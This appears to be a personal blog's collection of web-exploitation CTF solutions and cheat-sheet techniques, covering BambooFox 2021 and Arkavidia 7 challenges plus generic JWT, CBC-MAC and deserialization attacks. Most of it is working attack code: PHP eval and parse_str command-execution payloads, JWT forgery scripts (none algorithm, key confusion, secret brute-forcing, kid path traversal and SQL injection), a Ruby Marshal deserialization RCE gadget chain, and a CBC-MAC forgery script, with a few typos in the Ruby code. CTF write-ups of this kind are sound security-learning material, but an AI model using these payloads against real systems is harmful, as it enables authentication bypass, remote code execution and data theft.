---
title: "CTF Web Collection"
categories:
  - CTF
tags:
  - ctf
modified: 2021-01-21
---
CTF Collection, only Web Exploitation.

## PHP Eval with math function only (Calc.exe - BambooFox CTF 2021)
We got a simple calculator app based on PHP and it will catch the `_GET['expression']` parameter as our input.

<a href="/assets/images/ctf/bamboo/1.png"><img src="/assets/images/ctf/bamboo/1.png"></a>

Let's see the source code, maybe we found something useful. 

<a href="/assets/images/ctf/bamboo/2.png"><img src="/assets/images/ctf/bamboo/2.png"></a>

There is a `/source` there, let's check it out.

<a href="/assets/images/ctf/bamboo/3.png"><img src="/assets/images/ctf/bamboo/3.png"></a>

So, we got the source code. It's simply filtering almost all but we can use the math functions that leads to code execution.

So i use this payload from [here](https://www.anquanke.com/post/id/220813#h3-2) to find the right math function to produce strings / codes that we want.

```php
<!DOCTYPE html>
<html>
<body>

<?php
$whitelist = [ 'abs' , 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos ' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod', 'getrandmax' , 'hexdec' , 'hypot', 'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , ' octdec' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt' , 'srand' , 'tan' , 'tanh']; 
$whitelist2 = [ 'acos' , 'acosh' , 'asin' , 'asinh' , 'atan2' , 'atan' , 'atanh' , 'base_convert' , 'bindec' , 'ceil' , 'cos' , 'cosh' , 'decbin' , 'dechex' , 'decoct' , 'deg2rad' , 'exp' , 'expm1' , 'floor' , 'fmod' ,'getrandmax' , 'hexdec' , 'hypot' ,'is_finite' , 'is_infinite' , 'is_nan' , 'lcg_value' , 'log10' , 'log1p' , 'log' , 'max' , 'min' , 'mt_getrandmax' , 'mt_rand' , 'mt_srand' , 'octdec ' , 'pi' , 'pow' , 'rad2deg' , 'rand' , 'round' , 'sin' , 'sinh' , 'sqrt', 'srand' , 'tan' , 'tanh' ,'abs' ];

foreach ($whitelist as $i): foreach ($whitelist2 as $k): echo $k^$i^ "*" ; echo " " . $i. " " . $k; echo "<br/>" ; endforeach ; endforeach ;




?>
```

The result for producing the " *" (including the space). I need it because i want to run `system(ls *)`.

<a href="/assets/images/ctf/bamboo/4.png"><img src="/assets/images/ctf/bamboo/4.png"></a>

So we got `10 sin pi` (for example). The `10` is on hexadecimal. 

<a href="/assets/images/ctf/bamboo/5.png"><img src="/assets/images/ctf/bamboo/5.png"></a>

We can use `dechex` function to produce the `10`. Let's try running it on the real website.

<a href="/assets/images/ctf/bamboo/6.png"><img src="/assets/images/ctf/bamboo/6.png"></a>

So we just need to produce `system` and `ls` with math function. Here i use `base_convert` to produce the strings. 

<a href="/assets/images/ctf/bamboo/7.png"><img src="/assets/images/ctf/bamboo/7.png"></a>
<a href="/assets/images/ctf/bamboo/8.png"><img src="/assets/images/ctf/bamboo/8.png"></a>

So, let's use all the payload we generate before. It's looks something like this `base_convert(1751504350,10,36)(base_convert(784,10,36).(dechex(16)^asinh^pi)`.

<a href="/assets/images/ctf/bamboo/9.png"><img src="/assets/images/ctf/bamboo/9.png"></a>

So we got no flag. I found the flag is on the `/` directory.

<a href="/assets/images/ctf/bamboo/10.png"><img src="/assets/images/ctf/bamboo/10.png"></a>

Let's `cat` the flag!

<a href="/assets/images/ctf/bamboo/11.png"><img src="/assets/images/ctf/bamboo/11.png"></a>

##### Resources:
> - [https://www.anquanke.com/post/id/220813#h3-2](https://www.anquanke.com/post/id/220813#h3-2)
- [https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math](https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math)

## SSRF bypass using domain obfuscator (SSRFrog - BambooFox CTF 2021)
Let's open the website.

<a href="/assets/images/ctf/bamboo/12.png"><img src="/assets/images/ctf/bamboo/12.png"></a>

Let's check the source code.

<a href="/assets/images/ctf/bamboo/13.png"><img src="/assets/images/ctf/bamboo/13.png"></a>
<a href="/assets/images/ctf/bamboo/14.png"><img src="/assets/images/ctf/bamboo/14.png"></a>

We need to access the `http://the.c0o0o0l-fl444g.server.internal`. But, we can't use repeated characters. We can use this [domain obfuscator](https://splitline.github.io/domain-obfuscator/) to bypass this.

Final payload will be `HTtp:/ｔhＥ.c0o₀O⁰L-fl4⁴４g｡sEｒvｅr．inＴeʳｎaｌ`. The result:

<a href="/assets/images/ctf/bamboo/15.png"><img src="/assets/images/ctf/bamboo/15.png"></a>

## PHP Challenge (ヽ(#`Д´)ﾉ - BambooFox CTF 2021)
<a href="/assets/images/ctf/bamboo/16.png"><img src="/assets/images/ctf/bamboo/16.png"></a>

Our input is verified to be less than 0xA characters and not contain any alphanumeric characters. It is then `eval`'d after being passed through `print\_r`. The catch is the length and character checks are done using `!strlen` and `!preg_match` instead of `cond!==false`.

We can pass in an array and it will always bypass these checks, the next thing is to construct input that is valid PHP after being passed in. The PHP parser doesn't really like the array output, and will first throw a syntax error. We can deal with this by adding a constant and closing parenthesis.

We then get an `illegal offset type` error. I was able to get around this by making the array indice a variable, which gives a `illegal offset type` warning (I have no idea). Now that our input is accepted as PHP we just add a ``print \`cat /flag\*\`` to get our flag.

<a href="/assets/images/ctf/bamboo/18.png"><img src="/assets/images/ctf/bamboo/18.png"></a>
<a href="/assets/images/ctf/bamboo/19.png"><img src="/assets/images/ctf/bamboo/19.png"></a>

The result: 

<a href="/assets/images/ctf/bamboo/17.png"><img src="/assets/images/ctf/bamboo/17.png"></a>

Alternative: `%E3%83%BD(%23%60%D0%94%C2%B4)%EF%BE%89[0/*]=1*/]);system("cat%20/flag_de42537a7dd854f4ce27234a103d4362");/*`.

##### Resources:
> - [https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md](https://github.com/Seraphin-/ctf/blob/master/bamboofox_2021/face.md)
- [https://spotless.tech/bambooctf-2021-angryface-php.html](https://spotless.tech/bambooctf-2021-angryface-php.html)


## JWT bypass using None algorithm
Using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool).

Step:
- Tamper the JWT

  ```bash
  $ python3 jwt_tool.py jwt -T
  ```

- Use None algorithm

  ```bash
  python3 jwt_tool.py jwt -Xa (using none algorithm)
  ```

- ALTERNATIVE: remove the signature

  ```
  Example:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.NWU2MWNiMjg0YWU3NDM0ZDFmYjYwNTYyY2RmNzNkMzM4NDdhZDE4YTUxZjYwZmI3NTI3Y2Y5YjNiYjMyMzlhOA

  Remove the signature:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImEiLCJpYXQiOiIxNjExMjAxNDQyIn0.
  ```

##### Resources:
> - [https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)


## JWT bypass with public key 
Using python:

```python
import hmac
import base64
import hashlib

f = open("public.pem")
key = f.read()
# RS -> HS and login -> admin
str="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"

sig = base64.urlsafe_b64encode(hmac.new(key,str,hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(str+"."+sig)
```

Using ruby:

```ruby
require 'base64'
require 'openssl'

f = File.open("public.pem").read

TOKEN = "FULLJWTTOKENHERE"

header, payload, signature = TOKEN.split('.')

decoded_header = Base64.decode64(header)
decoder_header.gsub!("RS256", "HS256")
puts decoded_header
new_header = Bas64.strict_encode64(decoded_header).gsub("=","")

decoded_payload = Base64.decode64(payload)
decoder_payload.gsub!("your_user_here", "admin")
puts decoded_payload
new_payload = Bas64.strict_encode64(decoded_payload).gsub("=","")

data = new_header + "." + new_payload

signature = Bas64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), pub, data))
```

## JWT bypass no verify
This only works if the server didn't verify the signature. We can tamper the JWT using [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool). Step-by-step:
- Tamper the JWT

  ```bash
  $ python3 jwt_tool.py jwt -T
  ```

- Profit

## JWT bypass weak secret
Step-by-step:
1. Bruteforce the secret:

    - Using ruby:

      ```ruby
      require 'base64'
      require 'openssl'

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      header, data, signature = jwt.split('.')

      def sign(data, secret)
          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
      end
      File.readlines("/usr/share/wordlists/rockyou.txt").each do |line|
          line.chomp!
          if sign(header+"."+data, line) == signature
              puts line
              exit
          end
      end
      ```

    - Using python:

      ```python
      import hmac
      import hashlib
      import base64

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      h, p, s = jwt.split(".")

      def sign(str, key):
          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

      file = open("/usr/share/wordlists/rockyou.txt", 'r')
      lines = file.readlines()

      for line in lines:
          key = line.strip()
          if sign(h + "." + p, key) == s:
              print(key)
      ```

    - Using hashcat:

      ```bash
      $ hashcat -m 16500 -d 3 jwt /usr/share/wordlists/rockyou.txt
      ```


2. Sign the JWT

    - Using ruby:

      ```ruby
      require 'base64'
      require 'openssl'

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
      secret = "pentesterlab"
      header, data, signature = jwt.split('.')

      def sign(data, secret)
          Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('SHA256'), secret, data)).gsub("=","")
      end

      require 'json';
      payload = JSON.parse(Base64.urlsafe_decode64(data+"=="))
      payload["user"] = "admin"

      newdata = Base64.urlsafe_encode64(payload.to_json).gsub("=", "")
      puts header+"."+newdata+"."+sign(header+"."+newdata, secret)
      ```

    - Using python:

      ```python
      import hmac
      import hashlib
      import base64

      jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

      h, p, s = jwt.split(".")

      def sign(str, key):
          return base64.urlsafe_b64encode(hmac.new(key, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

      key = "something"
      payload = "eyJ1c2VyIjoiYWRtaW4ifQo"
      print(h + "." + payload + "." + sign(h + "." + payload, key))
      ```
    
    - Using ruby interactive (with hashcat):
  
      ```bash
      $ gem install jwt 
      $ irb

      require 'jwt'

      payload = {"user":"admin"}

      JWT.encode payload, "SECRET", "HS256"
      ```

## JWT bypass kid (key id)
[KID](https://tools.ietf.org/html/rfc7517) (key id) is used to retrieve a **key** from the **filesystem** or a **database**. If the parameter is injectable, we can manipulate the header and payload and bypass the signature. Step-by-step:

- Sign with directory transversal (null secret) on python:

    ```python
    import hmac
    import hashlib
    import base64
    import json

    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
    # base64 decoded:
    # header = {"typ":"JWT","alg":"HS256","kid":"0001"}
    # payload = {"user":null}

    # change the header and the payload
    header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../../../../../../../../../../../dev/null"}
    secret = ""
    payload = {"user":"admin"}

    str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")

    sig = base64.urlsafe_b64encode(hmac.new(secret, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

    print(str+"."+sig)
    ```

- Sign with SQL injection (python):

    ```python
    import hmac
    import hashlib
    import base64
    import json

    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ
    # base64 decoded:
    # header = {"typ":"JWT","alg":"HS256","kid":"key1"}
    # payload = {"user":null}

    # change the header and the payload
    header = {"typ":"JWT","alg":"HS256","kid":"xyzabc' union select 'aaa"}
    secret = "aaa"
    payload = {"user":"admin"}

    str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")

    sig = base64.urlsafe_b64encode(hmac.new(secret, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

    print(str+"."+sig)
    ```

- Sign with existing file on the webserver (ruby):

    ```ruby
    require 'base64'
    require 'openssl'

    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
    # base64 decoded:
    # header = {"typ":"JWT","alg":"HS256","kid":"0001"}
    # payload = {"user":null}

    # we need to guess the bootstrap location
    header = {"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}
    payload = {"user":"admin"}

    data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
    data.gsub!("=","")

    # If we use booststrap.css for example, download the file first
    secret = File.open("bootstrap.css").read

    signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

    puts data+"."+signature
    ```

We can run code execution here if the server using `ruby` with `Kernel.open/open` (**Ruby will run the filename as a command if the filename starts with `|`**). Look the CVE [here](https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/). We just need to change the `kid` value to `| your-command-here` and we good to go! We don't need to change the payload or the secret because the code execution will occurs before the secret key is used. 

## JWS embedded jwk
It's [CVE-2018-0114](https://nvd.nist.gov/vuln/detail/CVE-2018-0114). The header and the payload are base64 without padding (Base64({})), but the signature is base64 encoded.

Here is the example code:

```ruby
# eyJhbGciOiJSUzI1NiIsImtpZCI6IlJYODdQUl96YVBFVkowNlBIUVBZb0MxZHVUVnBrTG5Ia01XajB6bzBoRTAifQ.
# YWJj.
# guPNBE8BAP3ZOXrUXu_pOv7TD9qxuzy1X0vR17EW1XeIYiV6n4ayw-9lX2eHk3-fdTxy-OiF2RMFhQcU8lN5qcsn1QtXCzmMkvYIw4xkBplu_LhUGeqvzKzg7CccC0F4sD8ZED3q9sYopcy7Mcnx_JOhpTtWs4ZjV7NURCl32jBuhSbuPQeaIebzbPlCgAZH8As5j1W0Knt_14au7N4PC4T1izmvk_vucmz3iGmTCgVoiQqz1YJd3LbSlEet3nao24kbEiURzGhCNGjSb6Qab2DHUz9CkPnX47UdIvSsfLtQ6GOh2pzvRXuK3A21OLeu4p0E_21Y-HEt1NATj-Qujg

# run this first 
# $ openssl genrsa -out private.pem 2048

require 'json'
require 'openssl'
require 'base64'

priv_key = OpenSSL::PKey::RSA.new File.read 'private.pem'
pub_key = priv_key.public_key
n = Base64.urlsafe_encode64(pub_key.n.to_s(2)).gsub(/=+$/, "")
e = Base64.urlsafe_encode64(pub_key.e.to_s(2)).gsub(/=+$/, "")

header = {"alg":"RS256", "jwk" => {"kty" => "RSA", "kid" => "hello", "use" => "sig", "n" => n, "e" => e }}

# Our payload goes here
payload = Base64.urlsafe_encode64("admin").gsub(/=+$/, "")
token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/, "") + "." + payload
sign = priv_key.sign("SHA256", token)

puts token + "." + Base64.urlsafe_encode64(sign).gsub(/=+$/, "")
```

## Leaked .git
We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory

## CBC-MAC
In this example, we will change our user to `administrator`. We know that CBC has 8 bytes So we need to create 2 `user`. It's `administ` and `rator`. We need to generate the first signature using `administ`, because the IV is null. After that, we XOR the signature from `administ` and `rator` so we get signature2. After that, we generate `administrator` with signature2.

Here is the code:

```ruby
require 'httparty'
require 'base64'

URL = "URL"
def login(username, password)
    res = HTTParty.post(URL+'login.php', body: { username: username, password: password}, follow_redirects: false)

    # auth = Val
    return res.headers['set-cookie'].split("=")[1]
end

cookie =  login("administ", "aaa")
signature1 = Base64.decode64(cookie).split("--")[1]

def xor(str1, str2)
    ret = ""
    str1.split(//).each_with_index do |c, i|
        ret[i] = (str1[i].ord ^ str2[i].ord).chr
    end
    return ret
end

username2 = xor("rator\00\00\00", signature1)
cookie2 = login(username2, "aaa").gsub("%2B", "+")
signature2 = Base64.decode64(cookie2).split("--")[1]

puts Base64.encode64("administrator--#{signature2}")
```

If we can modify the IV value, we are able to change the first block of the cleartext without impacting the signature. The only thing we need to keep in mind is that a **XOR is used between the IV and the first block**. Any modification of the cleartext will need to be XOR'ed with the IV. So if we change the value of the first byte of the first block from a to b, we will need to change the first byte of the IV by XORing with a^b.

Here is the example code:

```ruby
require 'uri'
require 'base64'

iv = "QA2vUfmm%2FNE%3D"
auth = "Y2RtaW5pc3RyYXRvci0tEnzv4HnJXPA%3D"

decoded_iv = Base64.decode64(URI.unescape(iv))
decoded_auth = Base64.decode64(URI.unescape(auth))

# Craft the payload
decoded_iv[0] = ('a'.ord^'c'.ord^decoded_iv[0].ord).chr
decoded_auth[0] = 'a'

new_iv = URI.escape(Base64.strict_encode64(decoded_iv), "+=/")
new_auth = URI.escape(Base64.strict_encode64(decoded_auth), "+=/")

puts("iv = " + new_iv)
puts("auth = " + new_auth)
```

## Ruby 2.x RCE Deserialization
Use this payload (from [here](https://www.elttam.com.au/blog/ruby-deserialization/)):

```ruby
#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

And enter the base64 encoded payload and we got our command working.


## parse_str variable overwrite leads to RCE (Arkavidia 7)
Vulnerable code:

```php
<?php
error_reporting(0);

if ($_GET['debug']) {
    highlight_file(__FILE__);
    return;
}

$calculate = function($a, $b) {
    return $a + $b;
};

$param = parse_str(file_get_contents("php://input"));

if ($param['a']) {
    $a = $param['a'];
}

if ($param['b']) {
    $b = $param['b'];
}

if ($a && $b) {
    $result = $calculate($a, $b);
}
?>
<html>
    <head>
        <title>The Ultimate Sum Calculator-inator</title>
    </head>
    <body>
        <h1>The Ultimate Sum Calculator-inator</h1>
        <form method="post">
            <input name="a" type="text" placeholder="First number" />
            <div style="height: 4px"></div>
            <input name="b" type="text" placeholder="Second number" />
            <br /><br />
            <input type="submit" value="Calculate" />
        </form>
        <?php if ($result) echo "The result is $result"; ?>
    </body>
    <!-- ?debug=1 -->
</html>
```

We can use this exploit to overwrite the `calculate` variable to `system` and triggers code execution:

```
calculate=system&&a=cat /.flag/flag.txt&&b=dummy
```

The result:

<a href="/assets/images/ctf/arkav7/1.png"><img src="/assets/images/ctf/arkav7/1.png"></a>

## XSS steal admin auth (Arkavidia 7)
Open [XSSHunter](https://xsshunter.com/app) and use the payload and send it to `admin`. Wait for admin to visit our payload and we got the result.

<a href="/assets/images/ctf/arkav7/3.jpg"><img src="/assets/images/ctf/arkav7/3.jpg"></a>

Follow the link and we got the flag.

<a href="/assets/images/ctf/arkav7/2.jpg"><img src="/assets/images/ctf/arkav7/2.jpg"></a>











## Other
> - [https://github.com/Kirill89/prototype-pollution-explained](https://github.com/Kirill89/prototype-pollution-explained)
- [https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4](https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4)
- [Nginx alias path traversal](https://hackerone.com/reports/312510)
- [SSTI Jinja2](https://hackmd.io/@Chivato/HyWsJ31dI)
